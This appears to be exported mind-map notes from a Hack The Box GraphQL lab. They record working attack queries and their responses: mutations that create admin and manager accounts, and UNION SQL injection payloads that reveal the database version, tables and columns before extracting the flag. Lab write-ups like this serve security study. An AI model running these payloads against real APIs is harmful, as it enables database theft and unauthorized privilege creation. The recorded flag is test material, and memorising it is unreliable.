> **Source path:** Attacking GraphQL → Skills Assessment → Exploit the vulnerable GraphQL API to obtain the flag. → introspection → after Gemini review → mutation ExecuteAddEmployee {   addEmployee(input: {     username: "pwned_admin"     employeeId: 9999     role: "manager"   }) {     employee {       id       username       employeeId       role     }   } → {   "data": {     "addEmployee": {       "employee": {         "id": "RW1wbG95ZWVPYmplY3Q6NA==",         "username": "pwned_admin",         "employeeId": 9999,         "role": "manager"       }     }   } }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 57b2fa64-698c-433d-b720-2b81cc89eaa6 -->

> [!output]+ 🟨 Output 038
> {
>   "data": {
>     "addEmployee": {
>       "employee": {
>         "id": "RW1wbG95ZWVPYmplY3Q6NQ==",
>         "username": "system_root",
>         "role": "admin"
>       }
>     }
>   }
> }
>
> **Source path:** Attacking GraphQL → Skills Assessment → Exploit the vulnerable GraphQL API to obtain the flag. → Mutation → query {   __schema {     mutationType {       name       fields {         name         args {           name           defaultValue           type {             ...TypeRef           }         }       }     }   } }  fragment TypeRef on __Type {   kind   name   ofType {     kind     name     ofType {       kind       name       ofType {         kind         name         ofType {           kind           name           ofType {             kind             name             ofType {               kind               name               ofType {                 kind                 name               }             }           }         }       }     }   } } → mutation InjectAdminEmployee {   addEmployee(input: {     username: "system_root"     employeeId: 1000     role: "admin"   }) {     employee {       id       username       role     }   } } → {   "data": {     "addEmployee": {       "employee": {         "id": "RW1wbG95ZWVPYmplY3Q6NQ==",         "username": "system_root",         "role": "admin"       }     }   } }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7123fb00-3e80-4ce2-af83-ceff6abcc937 -->

> [!output]+ 🟨 Output 039
> {
>   "data": {
>     "customerByName": {
>       "id": "Q3VzdG9tZXJPYmplY3Q6MQ==",
>       "firstName": "2",
>       "lastName": "10.11.6-MariaDB-0+deb12u1",
>       "address": "4"
>     }
>   }
> }
>
> **Source path:** Attacking GraphQL → Skills Assessment → Exploit the vulnerable GraphQL API to obtain the flag. → SQLI → Working payload → query TestCustomerSQLi {   customerByName(     apiKey: "0711a879ed751e63330a78a4b195bbad"     lastName: "invalid_name' UNION SELECT '1', '2', @@version, '4' -- -"   ) {     id     firstName     lastName     address   } } → {   "data": {     "customerByName": {       "id": "Q3VzdG9tZXJPYmplY3Q6MQ==",       "firstName": "2",       "lastName": "10.11.6-MariaDB-0+deb12u1",       "address": "4"     }   } }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: be5fc9a6-a2e3-4056-8d1d-a137718a0821 -->

> [!output]+ 🟨 Output 040
> {
>   "data": {
>     "customerByName": {
>       "id": "Q3VzdG9tZXJPYmplY3Q6MQ==",
>       "firstName": "2",
>       "lastName": "id,username,employee_id,role",
>       "address": "4"
>     }
>   }
> }
>
> **Source path:** Attacking GraphQL → Skills Assessment → Exploit the vulnerable GraphQL API to obtain the flag. → SQLI → Columns name → query DumpEmployeeColumns {   customerByName(     apiKey: "0711a879ed751e63330a78a4b195bbad"     lastName: "x' UNION SELECT '1', '2', GROUP_CONCAT(column_name), '4' FROM information_schema.columns WHERE table_name='employee' -- -"   ) {     id     firstName     lastName     address   } } → {   "data": {     "customerByName": {       "id": "Q3VzdG9tZXJPYmplY3Q6MQ==",       "firstName": "2",       "lastName": "id,username,employee_id,role",       "address": "4"     }   } }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 0d29d9dc-7ad1-4628-aa39-c881d0648d51 -->

> [!output]+ 🟨 Output 041
> {
>   "data": {
>     "customerByName": {
>       "id": "Q3VzdG9tZXJPYmplY3Q6MQ==",
>       "firstName": "2",
>       "lastName": "api_key,employee,flag,product,customer",
>       "address": "4"
>     }
>   }
> }
>
> **Source path:** Attacking GraphQL → Skills Assessment → Exploit the vulnerable GraphQL API to obtain the flag. → SQLI → Table name → query DumpAllTables {   customerByName(     apiKey: "0711a879ed751e63330a78a4b195bbad"     lastName: "x' UNION SELECT '1', '2', GROUP_CONCAT(table_name), '4' FROM information_schema.tables WHERE table_schema=database()-- -"   ) {     id     firstName     lastName     address   } } → {   "data": {     "customerByName": {       "id": "Q3VzdG9tZXJPYmplY3Q6MQ==",       "firstName": "2",       "lastName": "api_key,employee,flag,product,customer",       "address": "4"     }   } }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 636f5f34-cbf8-48d0-808a-784eb0c82eaa -->

> [!output]+ 🟨 Output 042
> {
>   "data": {
>     "customerByName": {
>       "id": "Q3VzdG9tZXJPYmplY3Q6MQ==",
>       "firstName": "2",
>       "lastName": "HTB{f1d663c11e6db634e1c9403d0e8e3a35}",
>       "address": "4"
>     }
>   }
> }
>
> **Source path:** Attacking GraphQL → Skills Assessment → Exploit the vulnerable GraphQL API to obtain the flag. → SQLI → get the Flag → query ExfiltrateFlag {   customerByName(     apiKey: "0711a879ed751e63330a78a4b195bbad"     lastName: "x' UNION SELECT '1', '2', flag, '4' FROM flag -- -"   ) {     id     firstName     lastName     address   } } → {   "data": {     "customerByName": {       "id": "Q3VzdG9tZXJPYmplY3Q6MQ==",       "firstName": "2",       "lastName": "HTB{f1d663c11e6db634e1c9403d0e8e3a35}",       "address": "4"     }   } }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e6809ac1-6bcc-4496-b5e2-068cbea390d5 -->
